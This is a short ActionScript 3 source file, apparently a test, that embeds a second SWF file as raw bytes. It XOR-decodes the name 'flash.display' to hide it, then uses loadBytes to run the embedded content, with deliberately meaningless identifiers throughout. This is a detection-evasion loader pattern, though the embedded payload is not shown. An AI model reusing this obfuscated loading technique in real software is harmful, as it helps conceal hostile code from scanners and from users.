package testflash1
{ 
	import flash.display.*;
	import flash.text.*;
	import flash.utils.*;
	import flash.net.*;
	import flash.events.*;
    import flash.system.*;
 

    public class testflash1 extends Sprite
    {
        [Embed(source="testflash.swf", mimeType="application/octet-stream")]
        private static const DSs7dks:Class;
        
        
        private function fdsgsdgds(encrypted:String):String
        {
            var decrypted:String = "";
            for (var i:int = 0; i < encrypted.length; i++)
            {
                decrypted += String.fromCharCode(encrypted.charCodeAt(i)^0x0a);
            }
            return decrypted;
        }
        

        public function testflash1()
        {
            
            // Load embedded content
            var ns:Namespace = new Namespace(fdsgsdgds("lfkyb$ncyzfks"));
            var x:Object = new ns::Loader();

            var swfObj:Object = new DSs7dks();
            var u:ByteArray = swfObj as ByteArray;
            
            x.loadBytes(u);
            
            addChild(x as DisplayObject);    
            
        }
    } 
}
